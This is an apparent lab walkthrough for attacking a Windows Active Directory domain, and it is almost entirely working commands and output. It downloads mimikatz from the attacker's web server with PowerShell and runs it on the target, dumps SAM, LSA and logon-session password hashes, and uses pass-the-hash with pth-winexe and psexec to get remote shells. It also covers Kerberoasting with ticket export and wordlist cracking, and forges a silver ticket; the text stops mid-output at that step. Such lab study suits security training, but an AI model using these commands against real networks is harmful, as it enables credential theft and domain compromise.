# Attacking Active Directory
## Lab Environment

|Server|IP Address|OS|Function|
|---|---|---|---|
|kali.vx|192.168.17.10|Kali Linux 2022.1|Attacking Machine|
|dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
|svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|

## Nmap Scan

```console
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV -Pn 192.168.17.11-13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:29 +08
Nmap scan report for 192.168.17.11
Host is up (0.00090s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-25 04:32:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57911/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57912/tcp open  msrpc         Microsoft Windows RPC
57924/tcp open  msrpc         Microsoft Windows RPC
57929/tcp open  msrpc         Microsoft Windows RPC
57960/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.17.12
Host is up (0.0011s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.17.13
Host is up (0.0013s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
```

# 1. Cached Credential Storage and Retrieval
**On Kali**: Setup web server to host `mimikatz`

```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```

**On Target**: Download and run `mimikatz`
- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Start-Process`

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
```

**On Target**: mimikatz commands
- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

- ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:

```console
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa /patch
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

## 1.1. Successful `lsadump::sam` example

```console
mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
Local SID : S-1-5-21-1540030335-1244868743-683777651

SAMKey : 3e3e9d70bd634ed43edbe5548d50e40e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e4eff03c20be1cf228acad5ae9dffa

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-GKEGHIVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 56498ceffdf35f16cffb36744b2f98f76955058b3918c827e173fc7aa401f31f
      aes128_hmac       (4096) : 1f052f941e6b84ff8df58a0157dd7b25
      des_cbc_md5       (4096) : d5612916b59bad51

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-GKEGHIVAdministrator
    Credentials
      des_cbc_md5       : d5612916b59bad51


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5a2b1b78290d381def497905d467fcff

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b848a29d177ddaf268c55ff8b0a27e40

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fd924dec8a07c294a448fe64a59d6253b11700fd8b9ba0b04914baca366adee8
      aes128_hmac       (4096) : a09548edf5d6ef88615586ad4315d147
      des_cbc_md5       (4096) : 982a37cb1998d66e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 982a37cb1998d66e


RID  : 000003eb (1003)
User : localadmin
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 16c96a30f045654ca0f5277d816dc3fc
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 35807c03d79f70538886cc1f45212e9c

* Primary:Kerberos-Newer-Keys *
    Default Salt : CLIENT.LAB.VXlocaladmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0cbf515a0f766032f6c3d226bebbb2de3ff3252c0107d545839a11da9ea0d723
      aes128_hmac       (4096) : 4541dc99ef9a196bfa67fdb81098a8e3
      des_cbc_md5       (4096) : ecd6e0d6237ca19e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : CLIENT.LAB.VXlocaladmin
    Credentials
      des_cbc_md5       : ecd6e0d6237ca19e
```

## 1.2. Successful `lsadump::lsa /patch` example

```console
mimikatz # lsadump::lsa /patch
Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003eb (1003)
User : localadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 5a2b1b78290d381def497905d467fcff
```

## 1.3. Successful `sekurlsa::logonpasswords` example

```console
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7831562 (00000000:0077800a)
Session           : Interactive from 0
User Name         : mike
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 9:13:04 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1105
        msv :
         [00000003] Primary
         * Username : mike
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
        tspkg :
        wdigest :
         * Username : mike
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : mike
         * Domain   : LAB.VX
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3508055 (00000000:00358757)
Session           : Interactive from 1
User Name         : domainadmin
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 8:48:56 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1104
        msv :
         [00000003] Primary
         * Username : domainadmin
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
        tspkg :
        wdigest :
         * Username : domainadmin
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : domainadmin
         * Domain   : LAB.VX
         * Password : (null)
        ssp :
        credman :
        cloudap :

••• OUTPUT TRUNCATED •••
```

# 2. Pass the Hash

☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of 32 zeros can used to fill the LM hash portion of the pth-winexe command

## 2.1. pth-winexe
- Domain account

```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\domainadmin

C:\Windows\system32>hostname
hostname
SVR
```

- Local account

```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
svr\administrator

C:\Windows\system32>hostname
hostname
SVR
```

## 2.2. mimikatz - sekurlsa::pth
### 2.2.1. Domain account
- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
- The `sekurlsa::pth` will spawn a new cmd window

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : domainadmin
domain  : lab.vx
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
  |  PID  2536
  |  TID  7400
  |  LSA Process is now R/W
  |  LUID 0 ; 10105231 (00000000:009a318f)
  \_ msv1_0   - data copy @ 00000129DC857510 : OK !
  \_ kerberos - data copy @ 00000129DC9DA8C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000129DC9D00E8 (32) -> null
```

- Connect to the target machine in the new cmd window

```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\dc cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\domainadmin

C:\Windows\system32>hostname
DC
```

### 2.2.2. Local account
- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : administrator
domain  : *
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
  |  PID  6872
  |  TID  5672
  |  LSA Process was already R/W
  |  LUID 0 ; 13220694 (00000000:00c9bb56)
  \_ msv1_0   - data copy @ 00000129DC9C5AB0 : OK !
  \_ kerberos - data copy @ 00000129DC9D8288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000129DBEE4128 (32) -> null
```

- Connect to the target machine in the new cmd window
- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd

```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\svr cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
svr\administrator

C:\Windows\system32>hostname
SVR
```

# 3. Service Account Attack
## 3.1. Kerberoasting
- Ref: <https://github.com/nidem/kerberoast>

### 3.1.1. Discover SPNs

```console
C:\Users\mike>setspn -Q */*
Checking domain DC=lab,DC=vx
CN=krbtgt,CN=Users,DC=lab,DC=vx
        kadmin/changepw
CN=SVR,CN=Computers,DC=lab,DC=vx
        TERMSRV/SVR
        TERMSRV/SVR.lab.vx
        RestrictedKrbHost/SVR
        HOST/SVR
        RestrictedKrbHost/SVR.lab.vx
        HOST/SVR.lab.vx
CN=CLIENT,CN=Computers,DC=lab,DC=vx
        TERMSRV/CLIENT
        TERMSRV/CLIENT.lab.vx
        RestrictedKrbHost/CLIENT
        HOST/CLIENT
        RestrictedKrbHost/CLIENT.lab.vx
        HOST/CLIENT.lab.vx
CN=DC,OU=Domain Controllers,DC=lab,DC=vx
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.lab.vx
        ldap/DC.lab.vx/ForestDnsZones.lab.vx
        ldap/DC.lab.vx/DomainDnsZones.lab.vx
        TERMSRV/DC
        TERMSRV/DC.lab.vx
        DNS/DC.lab.vx
        GC/DC.lab.vx/lab.vx
        RestrictedKrbHost/DC.lab.vx
        RestrictedKrbHost/DC
        RPC/cba15170-f237-42f7-a29f-3a1cd3cb839e._msdcs.lab.vx
        HOST/DC/LAB
        HOST/DC.lab.vx/LAB
        HOST/DC
        HOST/DC.lab.vx
        HOST/DC.lab.vx/lab.vx
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/cba15170-f237-42f7-a29f-3a1cd3cb839e/lab.vx
        ldap/DC/LAB
        ldap/cba15170-f237-42f7-a29f-3a1cd3cb839e._msdcs.lab.vx
        ldap/DC.lab.vx/LAB
        ldap/DC
        ldap/DC.lab.vx
        ldap/DC.lab.vx/lab.vx
CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
        MSSQLSvc/SVR.lab.vx:1433
        MSSQLSvc/SVR.lab.vx

Existing SPN found!
```

### 3.1.2. Request tickets

```console
PS C:\Users\mike> klist

Current LogonId is 0:0xa48995

Cached Tickets: (2)

#0>     Client: mike @ LAB.VX
        Server: krbtgt/LAB.VX @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/16/2022 9:53:54 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC.lab.vx

#1>     Client: mike @ LAB.VX
        Server: ldap/DC.lab.vx/lab.vx @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 4/16/2022 9:55:16 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC.lab.vx
PS C:\Users\mike> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\mike> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433


Id                   : uuid-95b73e7f-8a7a-493c-affd-383f7472dbfd-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 16/4/2022 2:00:51 am
ValidTo              : 16/4/2022 11:53:54 am
ServicePrincipalName : MSSQLSvc/SVR.lab.vx:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\Users\mike> klist

Current LogonId is 0:0xa48995

Cached Tickets: (3)

#0>     Client: mike @ LAB.VX
        Server: krbtgt/LAB.VX @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/16/2022 9:53:54 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC.lab.vx

#1>     Client: mike @ LAB.VX
        Server: MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/16/2022 10:00:51 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: DC.lab.vx

#2>     Client: mike @ LAB.VX
        Server: ldap/DC.lab.vx/lab.vx @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 4/16/2022 9:55:16 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC.lab.vx
```

### 3.1.2. Dump tickets
```console
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:53:54 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
   * Saved to file     : 0-40e10000-mike@krbtgt~LAB.VX-LAB.VX.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 16/4/2022 10:00:51 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi

[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:55:16 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : ldap/DC.lab.vx/lab.vx @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a50000-mike@ldap~DC.lab.vx~lab.vx-LAB.VX.kirbi
```

- ☝️ **Note**: to retrieve user kerberos tickets, do not use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

848     {0;000003e7} 0 D 20011          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;004e2d49} 2 F 6986530     LAB\mike        S-1-5-21-1470288461-3401294743-676794760-1105   (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 7103754     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)

mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;

[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;

[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:15:59 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : cifs/DC.lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

[00000003] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : cifs/DC.lab.vx/lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

[00000004] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : CLIENT$ @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;

[00000005] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : ldap/DC.lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

[00000006] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : LDAP/DC.lab.vx/lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
```

- ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
- e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors

```console
C:\Windows\System32>mimikatz

mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:33:45 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)


[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:34:21 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : cifs/svr.lab.vx @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)


[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:34:17 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : RPCSS/svr.lab.vx @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)


[00000003] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 16/4/2022 9:34:16 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
```

### 3.1.3. Crack the ticket to retrieve service account password (brute force)

#### Upload the ticket to Kali

```console
scp <ticket> kali@kali.vx:/home/kali/
```

#### Install kerberoast module

```console
sudo apt -y install kerberoast
```

#### Prepare word list

- Unpack existing `rockyou.txt` (❗14 million entries❗)

```console
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

- Using the original `rockyou.txt` will take a long time
- The rockyou list is sorted by popularity, use `head` to extract the top passwords for a more efficient crack (if the password is not in the top 100,000, probably bruteforce isn't the way to go)

```console
┌──(kali㉿kali)-[~]
└─$ sudo head -n 100000 /usr/share/wordlists/rockyou.txt >> rockyou.100k
```

- Time taken for kerberoast:

| Number of passwords | Time taken |
|---|---|
| 10,000 | 0m4.974s |
| 100,000 | 0m47.707s |
| 1000,000 | 8m14.453s |

#### Crack the ticket

```console
┌──(kali㉿kali)-[~]
└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.10k 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi


    USE HASHCAT, IT'S HELLA FASTER!!


Cracking 1 tickets...
found password for ticket 0: P@ssw0rd  File: 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi
Successfully cracked all tickets

real    0m4.974s
user    0m4.961s
sys     0m0.012s
```

## 3.2. Silver Ticket
### 3.2.1. Retrieve domain's numeric identifier

Security Identifier or SID format: `S-R-I-S`
- `S` - A literal `S` to identify the string as a SID
- `R` - Revision level, usually set to `1`
- `I` - Identifier-authority value, often `5` within AD
- `S` - Subauthority values:
  - Domain's numeric identifier, e.g. `21-1470288461-3401294743-676794760`
  - Relative identifier or RID representing the specific object in the domain, e.g. `1105`

```console
C:\Users\mike>whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
```

### 3.2.2. Generate hash value for service account password
```console
mimikatz # kerberos::hash /password:P@ssw0rd
        * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
        * aes128_hmac       f67365e0a00838aff75e6ca33f3c2be2
        * aes256_hmac       9e0de99003a18068f2e2186cd1162e9b6398f7b873854ccf16040ce16aa06d26
        * des_cbc_md5       76fdfece25e3da54
```

### 3.2.3. Purge existing kerberos tickkets
- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
```console
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```

### 3.2.4. Generate KRB_TGS ticket
- ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`

```console
mimikatz # kerberos::golden /user:nonexistentuser /domain:LAB.VX /sid:S-1-5-21-1470288461-3401294743-676794760 /id:1105 /target:svr.lab.vx:1433 /service:MSSQLSvc /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt
User      : nonexistentuser
Domain    : LAB.VX (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 1105
Groups Id : *513 512 520 518 519
ServiceKey: e19ccf75ee54e06b06a5907af13cef42 - rc4_hmac_nt
Service   : MSSQLSvc
Target    : svr.lab.vx:1433
